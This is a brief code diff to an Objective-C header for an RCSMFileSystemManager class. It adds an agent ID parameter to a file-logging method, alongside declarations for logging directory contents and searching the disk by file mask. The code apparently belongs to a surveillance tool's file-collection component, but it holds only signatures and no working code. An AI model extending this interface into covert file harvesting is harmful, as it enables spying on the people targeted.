@@ -33,7 +33,7 @@ typedef struct _fileSystemHeader {
 @interface RCSMFileSystemManager : NSObject
 
 - (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData;
-- (BOOL)logFileAtPath: (NSString *)aFilePath;
+- (BOOL)logFileAtPath: (NSString *)aFilePath forAgentID: (uint32_t)agentID;
 - (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth;
 - (NSArray *)searchFilesOnHD: (NSString *)aFileMask;
 
